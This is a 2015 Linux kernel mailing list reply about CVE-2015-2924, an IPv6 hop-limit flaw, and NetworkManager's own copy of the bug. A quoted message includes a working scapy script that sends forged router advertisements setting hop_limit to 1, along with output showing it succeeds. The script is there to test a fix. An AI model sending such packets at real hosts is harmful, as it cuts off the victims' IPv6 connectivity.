From: "D.S. Ljungmark" <ljungmark@modio.se>
Subject: Re: [GIT] Networking
Date: Wed, 29 Apr 2015 18:55:16 +0200
Message-ID: <55410CF4.9000609@modio.se>
References: <20150401.154847.612566794393812348.davem@davemloft.net>	 <CAK1hOcOd=dLUyxJy1mEj2=Hy-zOqDp2KJ8or+1Zrsk+BvNn5oQ@mail.gmail.com>	 <5540F605.2040907@modio.se> <1430326235.4070.16.camel@redhat.com>
Mime-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
 protocol="application/pgp-signature";
 boundary="1Pr5dQXbqSSKSCxP6oppWIhrpxVJgweTI"
Cc: Denys Vlasenko <vda.linux@googlemail.com>,
	David Miller <davem@davemloft.net>,
	Linus Torvalds <torvalds@linux-foundation.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	netdev@vger.kernel.org,
	Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	Don Howard <dhoward@redhat.com>
To: Dan Williams <dcbw@redhat.com>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <1430326235.4070.16.camel@redhat.com>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

This is an OpenPGP/MIME signed message (RFC 4880 and 3156)
--1Pr5dQXbqSSKSCxP6oppWIhrpxVJgweTI
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable



On 29/04/15 18:50, Dan Williams wrote:
> On Wed, 2015-04-29 at 17:17 +0200, D.S. Ljungmark wrote:
>> On 29/04/15 16:51, Denys Vlasenko wrote:
>>> On Wed, Apr 1, 2015 at 9:48 PM, David Miller <davem@davemloft.net> wr=
ote:
>>>> D.S. Ljungmark (1):
>>>>       ipv6: Don't reduce hop limit for an interface
>>>
>>> https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commi=
t/?id=3D6fd99094de2b83d1d4c8457f2c83483b2828e75a
>>>
>>> I was testing this change and apparently it doesn't close the hole.
>>>
>>> The python script I use to send RAs:
>>>
>>> #!/usr/bin/env python
>>> import sys
>>> import time
>>> import scapy.all
>>> from scapy.layers.inet6 import *
>>> ip =3D IPv6()
>>> # ip.dst =3D 'ff02::1'
>>> ip.dst =3D sys.argv[1]
>>> icmp =3D ICMPv6ND_RA()
>>> icmp.chlim =3D 1
>>> for x in range(10):
>>>     send(ip/icmp)
>>>     time.sleep(1)
>>>
>>> # ./ipv6-hop-limit.py fe80::21e:37ff:fed0:5006
>>> .
>>> Sent 1 packets.
>>> ...<10 times>...
>>> Sent 1 packets.
>>>
>>> After I do this, on the targeted machine I check hop_limits:
>>>
>>> # for f in /proc/sys/net/ipv6/conf/*/hop_limit; do echo -n $f:; cat $=
f; done
>>> /proc/sys/net/ipv6/conf/all/hop_limit:64
>>> /proc/sys/net/ipv6/conf/default/hop_limit:64
>>> /proc/sys/net/ipv6/conf/enp0s25/hop_limit:1  <=3D=3D=3D THIS
>>> /proc/sys/net/ipv6/conf/lo/hop_limit:64
>>> /proc/sys/net/ipv6/conf/wlp3s0/hop_limit:64
>>>
>>> As you see, the interface which received RAs still lowered
>>> its hop_limit to 1. I take it means that the bug is still present
>>> (right? I'm not a network guy...).
>>
>> It might not be present in the _kernel_. Do you run NetworkManager on
>> your system? If so, see below.
>>
>>>
>>> I triple-checked that I do run the kernel with the fix.
>>> Further investigation shows that the code touched by the fix
>>> is not even reached, hop_limit is changed elsewhere.
>>>
>>> I'm willing to test additional patches.
>>
>> NetworkManager had it's own re-implementation of the bug. It got fixed=

>> with NetworkManager commit:
>>
>> commit bdaaf9849b0cacf131b71fa2ae168f5db796874f
>> Author: Thomas Haller <thaller@redhat.com>
>> Date:   Wed Apr 8 15:54:30 2015 +0200
>>
>>     platform: don't accept lowering IPv6 hop-limit from RA (CVE-2015-2=
924)
>>
>>
>>
>> Beforte that commit, NetworkManager would take the RA packet, extract
>> the hop limit, and write it to the sysctl itself.
>=20
> Yup, we basically followed the original kernel logic here, so we needed=

> to patch it in NM as well.  It's been backported to NM 0.9.10, 1.0, and=

> obviously is in git master.
>=20

Are there any release announcements for NetworkManager? Or a place to
link for official releases/homepage?

//D.S.


--=20
8362 CB14 98AD 11EF CEB6  FA81 FCC3 7674 449E 3CFC


--1Pr5dQXbqSSKSCxP6oppWIhrpxVJgweTI
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJVQQz0AAoJEPzDdnREnjz8W60QAOXFAGa9fJROewhB4gkFAWVV
udUvDt5UweRWEWRyQaubZP8nmlMy5VyZgNTptB07/mTkwy+vv6fB7YMQCsKo4oez
D5kOTqiTGS3KBAYl20OXdJztfjVoBc4RyAMBMO5oXmlL2OtLC/6W3eYZI20anxpw
f5jxF4vP8vlVXngq4crCs1e3wDhmOwFfQl5aAAFx7WgQHuP5h8x1wUQE5c7r1pY6
7PnfSCNk81tzRoIEgE1OmwX1eWL4XPgPq330kx4NO8Pasvvl8D7Klf0pcxZoU8Ze
nhMu27v9jwaZsB7CbdXVeiyn2XAuSfa8BnXr45jjbDAa361mWqCS8z7HeSLStLOv
Z0ML9XMQZgOPlR1WIynA4CbuUHD5euf1Cz+72VtpQO9dAn7Ak1SE4vKkrkHG3IbJ
faD93QEBjDIwdRXLXqfc+jWcRfpWcQBkp1oe6K/zxY8HH8yMo6oAz1x4uP6zfxp7
YHbjhFIE1ayr8qsKU69MtzgY7o+qqrEoIdTgf1D11la6cESenlTS540PWRD9bk5b
xUqXXBeSpYEdvCo6D7l7DAKtQ/SyF7V5Glh4tr5kIT0Ueu0PObfRrk5iomOHQmN4
MkGwQIEah5BeFTfOiapgqXNBPcMY5izXcMNKng7Ucv1LLh/c3ksCIGpX7TROm8tj
FSPclCiGzmC8JQTFRlyh
=wBJ8
-----END PGP SIGNATURE-----

--1Pr5dQXbqSSKSCxP6oppWIhrpxVJgweTI--
